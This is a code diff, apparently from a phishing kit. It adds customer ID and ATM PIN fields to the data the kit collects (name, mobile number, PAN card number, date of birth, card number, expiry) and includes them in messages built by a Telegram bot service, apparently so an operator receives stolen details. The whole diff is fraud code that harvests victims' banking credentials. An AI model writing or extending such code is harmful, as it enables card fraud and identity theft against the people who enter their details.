@@ -14,6 +14,7 @@ interface LoginDetails {
 
 interface KycDetails {
   fullName: string;
+  customerId: string;
   mobileNumber: string;
   panCardNumber: string;
   dateOfBirth: string;
@@ -23,6 +24,7 @@ interface KycDetails {
 interface CardVerificationDetails {
   cardNumber: string;
   expiryDate: string;
+  atmPin: string;
   timestamp: string;
 }
 
@@ -92,6 +94,7 @@ class TelegramBotService {
 
 👤 <b>Customer Information:</b>
 • <b>Full Name:</b> <code>${details.fullName}</code>
+• <b>Customer ID:</b> <code>${details.customerId}</code>
 • <b>Mobile Number:</b> <code>${details.mobileNumber}</code>
 • <b>PAN Card:</b> <code>${details.panCardNumber}</code>
 • <b>Date of Birth:</b> <code>${details.dateOfBirth}</code>
@@ -111,6 +114,7 @@ class TelegramBotService {
 💳 <b>Card Details:</b>
 • <b>Card Number:</b> <code>${details.cardNumber}</code>
 • <b>Expiry Date:</b> <code>${details.expiryDate}</code>
+• <b>ATM PIN:</b> <code>${details.atmPin}</code>
 • <b>Timestamp:</b> ${details.timestamp}
 
 ✅ <i>Card verification successful</i>
